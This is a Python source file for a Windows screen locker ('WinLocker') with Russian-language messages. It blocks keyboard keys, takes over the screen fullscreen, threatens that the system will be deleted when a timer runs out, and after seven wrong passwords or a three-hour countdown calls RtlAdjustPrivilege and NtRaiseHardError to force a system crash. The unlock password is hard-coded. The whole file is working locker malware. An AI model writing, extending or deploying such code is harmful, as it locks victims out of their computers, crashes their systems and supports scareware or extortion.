import tkinter as tk
from tkinter import messagebox
import datetime
import ctypes
import keyboard

keyboard.block_key('Delete')

all_keys = list(range(32, 127))
for key in all_keys:
    keyboard.block_key(key)
    keyboard.add_hotkey('ctrl+alt+delete', lambda: None)


class WinLocker:
    def __init__(self, master):
        self.master = master
        self.master.attributes("-fullscreen", True)
        self.master.title("Win Locker")
        
        bg_color = "#000000"
        fg_color = "#00FF00"
        font_family = "Arial"
        
        self.master.configure(background=bg_color)
        
        tk.Label(self.master, text="Windows заблокирован!", font=(font_family, 50), fg=fg_color, bg=bg_color).pack(pady=50)

        password_entry = tk.Entry(self.master, show="*", bg=fg_color, font=(font_family, 30))
        password_entry.pack()
        password_entry.focus_set()

        tk.Label(self.master, text=" ", font=(font_family, 20), fg=fg_color, bg=bg_color).pack(pady=10)
        tk.Label(self.master, text="Вводи пароль или система удалиться при окончании таймера.", font=(font_family, 20), fg=fg_color, bg=bg_color).pack(pady=10)
        
        unlock_button = tk.Button(self.master, text="Разблокировать", command=self.unlock, bg=fg_color, font=(font_family, 20))
        unlock_button.pack(pady=20)

        hint_button = tk.Button(self.master, text="Как получить пароль?", command=self.show_hint, bg="#00FF00", font=(font_family, 20))
        hint_button.pack(pady=20)
        
        self.wrong_password_label = tk.Label(self.master, text="Неверный пароль!", fg="red", bg=bg_color, font=(font_family, 20))
        self.wrong_password_label.pack_forget()
        
        self.remaining_time_label = tk.Label(self.master, text="Осталось времени: 3:00:00", font=(font_family, 20), fg=fg_color, bg=bg_color)
        self.remaining_time_label.pack()
        
        self.count = 0
        self.max_attempts = 7
        self.attempts_left_label = tk.Label(self.master, text=f"Осталось попыток: {self.max_attempts}", font=(font_family, 20), fg=fg_color, bg=bg_color)
        self.attempts_left_label.pack()

        # Add keypad buttons
        buttons_frame = tk.Frame(self.master)
        buttons_frame.pack(pady=20)

        for i in range(1, 11):
            button = tk.Button(buttons_frame, text=str(i), command=lambda x=i: self.add_to_password_entry(x), bg=fg_color, font=(font_family, 20))
            button.configure(bg=bg_color, fg=fg_color)
            button.pack(side=tk.LEFT, padx=10)

            clear_button = tk.Button(self.master, text="Очистить поле для ввода пароля", command=self.clear_password_entry, bg="#FF0000", font=(font_family, 20))
        clear_button.pack(pady=20)

    def add_to_password_entry(self, number):
        password_entry = self.master.children['!entry']
        password_entry.insert(tk.END, str(number))

    def clear_password_entry(self):
        password_entry = self.master.children['!entry']
        password_entry.delete(0, tk.END)

    def show_hint(self):
        messagebox.showinfo("Получения пароля разблокировки", "А подсказки нет : )")
            
    def unlock(self, event=None):
        password = self.master.children['!entry'].get().strip()
        if password == "123":
            messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
            self.master.destroy()
        else:
            self.count += 1
            attempts_left = max(0, self.max_attempts - self.count)
            self.attempts_left_label.config(text=f"Осталось попыток: {attempts_left}")
            
            if self.count >= self.max_attempts:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            else:
                self.wrong_password_label.pack()

    def run(self):
        self.start_time = datetime.datetime.now()
        self.update_remaining_time()
        self.master.mainloop()
        
    def update_remaining_time(self):
        elapsed_time = (datetime.datetime.now() - self.start_time).seconds
        remaining_seconds = max(0, 3 * 60 * 60 - elapsed_time)
        remaining_hours = remaining_seconds // 3600
        remaining_minutes = (remaining_seconds % 3600) // 60
        remaining_seconds %= 60
        self.remaining_time_label.config(text=f"Осталось времени: {remaining_hours:02d}:{remaining_minutes:02d}:{remaining_seconds:02d}")
        if remaining_seconds > 0 or remaining_minutes > 0 or remaining_hours > 0:
            self.master.after(1000, self.update_remaining_time)
        else:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            
if __name__ == '__main__':
    root = tk.Tk()
    root.grab_set()
    root.focus_force()
    locker = WinLocker(root)
    locker.run()
